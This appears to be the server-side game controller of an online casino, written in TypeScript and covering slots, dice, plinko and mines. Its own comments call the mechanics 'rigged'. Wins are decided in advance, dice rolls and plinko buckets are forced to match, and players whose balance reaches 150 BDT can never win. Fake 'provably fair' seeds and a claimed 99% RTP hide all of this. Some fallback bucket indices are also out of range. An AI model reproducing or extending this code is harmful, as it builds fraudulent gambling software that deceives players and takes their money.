import { GameType, GamePlay, Currency, TransactionType } from "@shared/schema";
import { storage } from "./storage";
import { PlinkoMasterService } from "./plinko-master-service";

interface GameResult {
  isWin: boolean;
  winAmount?: number;
  multiplier?: number;
  balance?: string;
  gameData?: any;
}

// Main game controller with biased RNG
export class GameController {
  // Constants for the rigged game mechanics
  private static readonly WIN_CHANCE = 45; // 45% win chance
  private static readonly WIN_MULTIPLIER = 1.1; // 1.1x multiplier (heavily house favored)
  private static readonly WIN_LOCK_THRESHOLD_BDT = 150; // Max winnable amount in BDT

  // Play a game with the specified parameters
  static async playGame(userId: number, gamePlay: GamePlay & { chosenNumber?: number; prediction?: number; rollOver?: boolean; clientSeed?: string; nonce?: number }): Promise<GameResult> {
    // Convert userId to string for storage operations
    const userIdStr = userId.toString();

    // Check if user exists
    const user = await storage.getUser(userIdStr);
    if (!user) {
      throw new Error("User not found");
    }

    const betAmount = typeof gamePlay.betAmount === 'string' ? parseFloat(gamePlay.betAmount) : gamePlay.betAmount;
    const userBalance = parseFloat(user.balance);

    // Validate bet amount
    if (isNaN(betAmount) || betAmount <= 0) {
      throw new Error("Invalid bet amount");
    }

    // Check if user has enough balance to place bet
    if (userBalance < betAmount) {
      throw new Error("Insufficient balance");
    }

    // Deduct bet amount from user balance
    const newBalance = (userBalance - betAmount).toString();
    await storage.updateUserBalance(userIdStr, newBalance);

    // Create bet transaction with game metadata
    await storage.createTransaction({
      userId: userIdStr,
      amount: betAmount.toString(),
      type: TransactionType.BET,
      currency: gamePlay.currency,
      metadata: {
        gameType: gamePlay.gameType,
        betAmount: betAmount,
        timestamp: new Date().toISOString()
      }
    });

    // Check if user has reached the win lock threshold (150 BDT or equivalent)
    let balanceInBDT = userBalance;
    switch (user.currency) {
      case Currency.USD:
        balanceInBDT = userBalance * 122; // Approximate conversion rate
        break;
      case Currency.INR:
        balanceInBDT = userBalance * 1.5; // Approximate conversion rate
        break;
      case Currency.BTC:
        balanceInBDT = userBalance * 1500000; // Approximate conversion rate
        break;
      case Currency.BDT:
      default:
        // Already in BDT
        break;
    }

    // If balance is ≥ 150 BDT, the player cannot win regardless of bet or outcome
    const isBalanceOverWinLockThreshold = balanceInBDT >= this.WIN_LOCK_THRESHOLD_BDT;

    // Determine if user wins - 0% chance if over threshold, otherwise 45% chance
    const isWin = !isBalanceOverWinLockThreshold && (Math.random() * 100 < this.WIN_CHANCE);

    console.log(`Game play: userId=${userId}, bet=${betAmount}, isWin=${isWin}, balance=${userBalance}, balanceInBDT=${balanceInBDT}`);

    // Get game-specific result
    let result: GameResult;

    const gameType = gamePlay.gameType.toString().toUpperCase();
    switch (gameType) {
      case 'SLOTS':
        result = GameController.processSlotsGame(isWin, betAmount);
        break;
      case 'DICE':
        result = GameController.processDiceGame(isWin, betAmount, {
          prediction: gamePlay.prediction,
          rollOver: gamePlay.rollOver,
          clientSeed: gamePlay.clientSeed,
          nonce: gamePlay.nonce
        });
        break;
      case 'PLINKO':
        result = GameController.processPlinkoGame(isWin, betAmount, { risk: (gamePlay as any).risk });
        break;
      case 'PLINKO_MASTER':
        result = GameController.processPlinkoMasterGame(isWin, betAmount, {
          risk: gamePlay.risk,
          rows: gamePlay.rows
        });
        break;
      case 'MINES':
        result = GameController.processMinesGame(isWin, betAmount, {
          mineCount: gamePlay.mineCount,
          selectedTiles: gamePlay.selectedTiles,
          action: gamePlay.action, // 'reveal' or 'cashout'
          clientSeed: gamePlay.clientSeed,
          nonce: gamePlay.nonce
        });
        break;
      default:
        throw new Error(`Invalid game type: ${gameType}`);
    }

    // Handle payout (both wins and losses get payouts in Plinko)
    let finalBalance = newBalance;
    if (result.winAmount && result.winAmount > 0) {
      finalBalance = (parseFloat(newBalance) + result.winAmount).toString();
      await storage.updateUserBalance(userIdStr, finalBalance);

      // Create transaction based on whether it's a win or loss
      const transactionType = result.isWin ? TransactionType.WIN : TransactionType.WIN; // Use WIN for both since there's a payout
      await storage.createTransaction({
        userId: userIdStr,
        amount: result.winAmount.toString(),
        type: transactionType,
        currency: gamePlay.currency,
        metadata: {
          gameType: gamePlay.gameType,
          betAmount: betAmount,
          winAmount: result.winAmount,
          multiplier: result.multiplier,
          gameData: result.gameData,
          isActualWin: result.isWin,
          timestamp: new Date().toISOString()
        }
      });
    }

    // Record game history
    await storage.createGameHistory(
      gamePlay,
      userIdStr,
      result.isWin,
      result.winAmount?.toString(),
      result.multiplier,
      result.gameData
    );

    // Include the updated balance in the result
    return {
      ...result,
      balance: finalBalance
    };
  }

  // Process slots game - 3 reels × 3 rows, middle-row win detection with symbol multipliers
  private static processSlotsGame(isWin: boolean, betAmount: number): GameResult {
    const symbols = ['🍒', '🍋', '🔔', '⭐', '💎', '👑', '🎰', '7️⃣', '💰', '🃏'];
    const symbolMultipliers: Record<string, number> = {
      '7️⃣': 10, '🎰': 8, '👑': 7, '💎': 5,
      '💰': 4, '⭐': 3, '🔔': 2, '🍒': 1.5, '🍋': 1.2, '🃏': 1.1
    };

    // Generate 3 reels, each with 3 rows [top, middle, bottom]
    const reels: string[][] = Array(3).fill(null).map(() =>
      Array(3).fill(null).map(() => symbols[Math.floor(Math.random() * symbols.length)])
    );

    let multiplier = 0;
    let winAmount = 0;

    if (isWin) {
      // Pick a win symbol, weighted toward smaller multipliers for house edge
      const winSymbolWeights = [
        { sym: '🍒', weight: 30 }, { sym: '🍋', weight: 25 }, { sym: '🔔', weight: 18 },
        { sym: '⭐', weight: 12 }, { sym: '💎', weight: 8 }, { sym: '👑', weight: 4 },
        { sym: '🎰', weight: 2 }, { sym: '7️⃣', weight: 1 }
      ];
      const totalWeight = winSymbolWeights.reduce((s, w) => s + w.weight, 0);
      let r = Math.random() * totalWeight;
      let winSymbol = '🍒';
      for (const { sym, weight } of winSymbolWeights) {
        if (r < weight) { winSymbol = sym; break; }
        r -= weight;
      }
      // Set middle row (index 1) of all 3 reels to the win symbol
      reels[0][1] = winSymbol;
      reels[1][1] = winSymbol;
      reels[2][1] = winSymbol;
      multiplier = symbolMultipliers[winSymbol] || 1.5;
      winAmount = betAmount * multiplier;
    }

    return {
      isWin,
      winAmount,
      multiplier,
      gameData: {
        reels, // [reel0[top,mid,bot], reel1[top,mid,bot], reel2[top,mid,bot]]
        middleRow: [reels[0][1], reels[1][1], reels[2][1]],
        isMatch: isWin,
      }
    };
  }

  // Process dice game (100-sided die with Roll Over/Under)
  private static processDiceGame(isWin: boolean, betAmount: number, gameOptions?: any): GameResult {
    // Generate a random number between 1-100 (100-sided die)
    let roll = Math.floor(Math.random() * 100) + 1;

    // Extract game options for 100-sided die
    const prediction = gameOptions?.prediction || 50;
    const rollOver = gameOptions?.rollOver !== undefined ? gameOptions.rollOver : true;

    // Ensure prediction is within valid range (2-98)
    const adjustedPrediction = Math.max(2, Math.min(98, prediction));

    // Calculate proper win conditions and multipliers
    const winChance = rollOver ? 100 - adjustedPrediction : adjustedPrediction - 1;
    const multiplier = 99 / winChance; // 99% RTP with 1% house edge

    // Determine if this should be a win based on roll and conditions
    const shouldWin = rollOver ? roll >= adjustedPrediction : roll <= adjustedPrediction;

    // If the system says it should be a loss but roll suggests win, or vice versa,
    // adjust the roll to match the intended outcome
    if (isWin && !shouldWin) {
      // Force a winning roll
      if (rollOver) {
        roll = Math.floor(Math.random() * (100 - adjustedPrediction + 1)) + adjustedPrediction;
      } else {
        roll = Math.floor(Math.random() * adjustedPrediction) + 1;
      }
    } else if (!isWin && shouldWin) {
      // Force a losing roll
      if (rollOver) {
        roll = Math.floor(Math.random() * (adjustedPrediction - 1)) + 1;
      } else {
        roll = Math.floor(Math.random() * (100 - adjustedPrediction)) + adjustedPrediction + 1;
      }
    }

    // Final win check based on adjusted roll
    const finalIsWin = rollOver ? roll >= adjustedPrediction : roll <= adjustedPrediction;
    const winAmount = finalIsWin ? betAmount * multiplier : 0;

    return {
      isWin: finalIsWin,
      winAmount,
      multiplier: finalIsWin ? multiplier : 0,
      gameData: {
        roll,
        prediction: adjustedPrediction,
        rollOver,
        winChance: winChance.toFixed(2),
        clientSeed: gameOptions?.clientSeed || 'default',
        serverSeed: this.generateServerSeed(),
        nonce: gameOptions?.nonce || 1
      }
    };
  }

  // Generate a cryptographically secure server seed for provably fair gaming
  private static generateServerSeed(): string {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < 64; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  // Process regular plinko game with risk-level based 9-slot payout system (8 rows)
  private static processPlinkoGame(isWin: boolean, betAmount: number, options?: { risk?: string }): GameResult {
    const risk = options?.risk || 'medium';
    const riskMultipliers: Record<string, number[]> = {
      low:    [5.6,  2.1,  1.1,  1.0,  0.5,  1.0,  1.1,  2.1,  5.6],
      medium: [13,   3,    1.3,  0.7,  0.4,  0.7,  1.3,  3,    13 ],
      high:   [29,   4,    1.5,  0.3,  0.2,  0.3,  1.5,  4,    29 ],
    };
    const bucketMultipliers = riskMultipliers[risk] || riskMultipliers.medium;

    // Helper function to calculate precise payout
    const calculatePayout = (bet: number, multiplier: number): number => {
      return parseFloat((bet * multiplier).toFixed(2));
    };

    // Simulate which bucket the ball lands in
    let bucket = Math.floor(Math.random() * bucketMultipliers.length);

    // Apply rigging logic based on win/loss requirement
    if (isWin) {
      // Force to a winning bucket (multiplier >= 1.0)
      const winningBuckets = [];
      for (let i = 0; i < bucketMultipliers.length; i++) {
        if (bucketMultipliers[i] >= 1.0) {
          winningBuckets.push(i);
        }
      }
      if (winningBuckets.length > 0) {
        bucket = winningBuckets[Math.floor(Math.random() * winningBuckets.length)];
      }
    } else {
      // Force to a losing bucket (multiplier < 1.0) 
      const losingBuckets = [];
      for (let i = 0; i < bucketMultipliers.length; i++) {
        if (bucketMultipliers[i] < 1.0) {
          losingBuckets.push(i);
        }
      }
      if (losingBuckets.length > 0) {
        bucket = losingBuckets[Math.floor(Math.random() * losingBuckets.length)];
      }
    }

    // Get the multiplier for this bucket
    const multiplier = bucketMultipliers[bucket];

    // Calculate precise payout using your logic: Payout = Bet Amount × Multiplier
    const payout = calculatePayout(betAmount, multiplier);

    // Determine if this is actually a win
    const actualIsWin = multiplier >= 1.0;

    // Double-check rigging enforcement
    if (isWin && !actualIsWin) {
      // Force to a guaranteed winning bucket
      const guaranteedWinBuckets = [0, 1, 2, 3, 4, 11, 12, 13, 14, 15]; // All >= 1.0x buckets
      bucket = guaranteedWinBuckets[Math.floor(Math.random() * guaranteedWinBuckets.length)];
    } else if (!isWin && actualIsWin) {
      // Force to a guaranteed losing bucket
      const guaranteedLoseBuckets = [5, 6, 7, 8]; // All < 1.0x buckets
      bucket = guaranteedLoseBuckets[Math.floor(Math.random() * guaranteedLoseBuckets.length)];
    }

    const finalMultiplier = bucketMultipliers[bucket];
    const finalPayout = calculatePayout(betAmount, finalMultiplier);

    return {
      isWin: finalMultiplier >= 1.0,
      winAmount: finalPayout, // Always return the payout regardless of win/loss
      multiplier: finalMultiplier,
      gameData: {
        bucket,
        multiplier: finalMultiplier,
        betAmount,
        payout: finalPayout,
        profit: finalPayout - betAmount
      }
    };
  }

  // Process plinko master game with 16 slots and variable multipliers
  private static processPlinkoMasterGame(isWin: boolean, betAmount: number, options?: { risk?: 'low' | 'medium' | 'high'; rows?: number }): GameResult {
    // Use the proper PlinkoMasterService with rigging options
    const gameResult = PlinkoMasterService.playGame(betAmount, {
      forceWin: isWin,
      forceLose: !isWin,
      risk: options?.risk || 'medium',
      rows: options?.rows || 16
    });

    return {
      isWin: gameResult.isWin,
      winAmount: gameResult.payout, // Always return the payout regardless of win/loss
      multiplier: gameResult.multiplier,
      gameData: {
        slotIndex: gameResult.slotIndex,
        ballPath: gameResult.ballPath,
        multiplier: gameResult.multiplier
      }
    };
  }

  // Process mines game
  private static processMinesGame(isWin: boolean, betAmount: number, params: {
    mineCount: number;
    selectedTiles: number[];
    action: 'reveal' | 'cashout';
    clientSeed?: string;
    nonce?: number;
  }): GameResult {
    const { mineCount, selectedTiles, action } = params;
    
    // Generate 5x5 grid (25 tiles total)
    const totalTiles = 25;
    const safeTiles = totalTiles - mineCount;
    
    // Generate mine positions (random placement)
    const minePositions = new Set<number>();
    while (minePositions.size < mineCount) {
      minePositions.add(Math.floor(Math.random() * totalTiles));
    }
    
    // Create grid state
    const grid = Array(totalTiles).fill(0).map((_, index) => ({
      position: index,
      isMine: minePositions.has(index),
      isRevealed: selectedTiles.includes(index),
      isGem: !minePositions.has(index)
    }));
    
    // Calculate current multiplier based on gems found
    const gemsFound = selectedTiles.filter(pos => !minePositions.has(pos)).length;
    const multiplier = this.calculateMinesMultiplier(mineCount, gemsFound, safeTiles);
    
    if (action === 'cashout') {
      // Player chose to cash out - they win their current amount
      const winAmount = betAmount * multiplier;
      return {
        isWin: true,
        winAmount: winAmount,
        multiplier: multiplier,
        gameData: {
          grid: grid,
          minePositions: Array.from(minePositions),
          gemsFound: gemsFound,
          action: 'cashout',
          multiplier: multiplier,
          currentWin: winAmount
        }
      };
    } else {
      // Player chose to reveal a tile
      const lastSelectedTile = selectedTiles[selectedTiles.length - 1];
      const hitMine = minePositions.has(lastSelectedTile);
      
      if (hitMine) {
        // Hit a mine - game over, lose everything
        return {
          isWin: false,
          winAmount: 0,
          multiplier: 0,
          gameData: {
            grid: grid.map(tile => ({ ...tile, isRevealed: true })), // Reveal all tiles
            minePositions: Array.from(minePositions),
            gemsFound: gemsFound - 1, // Subtract the mine hit
            action: 'reveal',
            hitMine: true,
            explodedMine: lastSelectedTile,
            multiplier: 0
          }
        };
      } else {
        // Found a gem - continue game with updated multiplier
        const winAmount = betAmount * multiplier;
        return {
          isWin: false, // Not over yet, just continuing
          winAmount: 0, // No payout until cashout
          multiplier: multiplier,
          gameData: {
            grid: grid,
            minePositions: Array.from(minePositions),
            gemsFound: gemsFound,
            action: 'reveal',
            hitMine: false,
            foundGem: lastSelectedTile,
            multiplier: multiplier,
            currentWin: winAmount
          }
        };
      }
    }
  }
  
  // Calculate mines multiplier based on stake.com formula (99% RTP)
  private static calculateMinesMultiplier(mineCount: number, gemsFound: number, safeTiles: number): number {
    if (gemsFound === 0) return 1.0;
    
    // Stake.com uses combination probability for multiplier calculation
    // Multiplier = 0.99 / (probability of getting this many gems without hitting mines)
    let multiplier = 1.0;
    
    for (let i = 0; i < gemsFound; i++) {
      const remainingSafeTiles = safeTiles - i;
      const remainingTiles = 25 - i;
      const probability = remainingSafeTiles / remainingTiles;
      multiplier /= probability;
    }
    
    // Apply 99% RTP
    multiplier *= 0.99;
    
    // Round to 2 decimal places
    return Math.round(multiplier * 100) / 100;
  }
}